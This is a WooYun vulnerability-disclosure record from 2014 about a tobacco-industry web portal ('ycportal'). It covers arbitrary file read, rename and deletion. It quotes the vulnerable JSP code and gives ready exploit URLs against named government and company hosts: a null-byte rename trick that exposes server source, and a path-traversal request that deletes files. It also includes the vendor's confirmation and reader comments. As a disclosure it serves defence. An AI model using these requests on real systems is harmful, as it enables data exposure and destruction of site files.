{"id": 45366, "wybug_id": "wooyun-2014-088367", "wybug_title": "某烟草系统任意文件操作可以shell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2014-12-24 17:01", "wybug_open_date": "2015-03-24 17:02", "wybug_type": "任意文件遍历/下载", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向公众公开  简要描述： 某烟草行业通用系统存在任意文件操作漏洞 详细说明：  1. 任意文件读取目录遍历：http://ccd.jxfda.gov.cn/ycportal/jsp/explorer/annex_file.jsp?url=/可通过url参数来获得整个网站的目录\n\n多处文件重命名，举一例子，jsp/explorer/renamedo.jsp\n<%@ page import=\"java.io.File\"%><%@ page import=\"com.yc.ycportal.BaseConfig\"%><%\tString url = request.getParameter(\"pp\");   //目录名\tString tt=request.getParameter(\"tt\");  //文件名\tString osstr =(String)BaseConfig.getValue(\"platform\");\tString dirname =\"\";\tif(\"windows\".equals(osstr))\t   \t   dirname=request.getRealPath(\"/\")+url+\"\\\\\"+tt;\telse \t       dirname=request.getRealPath(\"/\")+url+\"/\"+tt;\tint j = tt.indexOf(\".\");\tString str=tt.substring(j,tt.length()); //%00截断\tFile f1 = new File(dirname);\tString renameStr=request.getParameter(\"rename\");  //修改后的文件名        String dirname2=\"\";    if(\"windows\".equals(osstr))\t   \t\tdirname2=request.getRealPath(\"/\")+url+\"\\\\\"+renameStr+str;  //拼接\telse               dirname2=request.getRealPath(\"/\")+url+\"/\"+renameStr+str;\tFile refile = new File(dirname2);\tf1.renameTo(refile);\n此漏洞可以完美解决那种翻到了shell却不知道密码的情况。1. 利用方法：http://www.dtycgs.cn/ycportal/jsp/explorer/renamedo.jsp?pp=/jsp/bbsupload/&tt=upload_img.jsp&rename=upload_img.txt%00再访问：http://www.dtycgs.cn/ycportal/jsp/bbsupload/upload_img.txt即可查看原upload_img.jsp的源码内容\n\n   漏洞证明：  2. 多处任意文件删除，随便举例：delfile.jsp\n/ycportal/jsp/explorer/delfile.jsp<%@ page contentType=\"text/html; charset=gb2312\" language=\"java\" import=\"java.sql.*\" errorPage=\"\" %><%@ page import=\"java.io.File\"%><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><title>delfile</title></head><body><%\tString dirname=request.getRealPath(\"skin/manageimage\");//传参数\tString fileName = request.getParameter(\"fileName\");\tout.println(fileName);\tout.println(\"真实路径为：\" + dirname);\tFile f = new File(dirname,fileName); \tif(f.delete())\t{\t\tresponse.sendRedirect(\"test.jsp\");\t}\telse ...\n2. 利用方法（删除1中重命名的文件名来示例）http://www.dtycgs.cn/ycportal/jsp/explorer/delfile.jsp?fileName=/../../jsp/bbsupload/upload_img.txt此处后缀没有限制，也可以删除任意jsp后缀的文件。1. 利用方法：http://www.dtycgs.cn/ycportal/jsp/explorer/renamedo.jsp?pp=/jsp/bbsupload/&tt=upload_img.jsp&rename=upload_img.txt%00再访问：http://www.dtycgs.cn/ycportal/jsp/bbsupload/upload_img.txt即可查看原upload_img.jsp的源码内容\n\n2. 利用方法（删除1中重命名的文件名来示例）http://www.dtycgs.cn/ycportal/jsp/explorer/delfile.jsp?fileName=/../../jsp/bbsupload/upload_img.txt此处后缀没有限制，也可以删除任意jsp后缀的文件。   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-29 14:39 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给江西分中心，由江西分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-21 17:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  哦哦好像这方法有点意思，哈    \n     2015-03-24 20:59 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  @wefgod 请收下我的膝盖，俺对你如那滔滔江水连绵不绝~~你懂的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}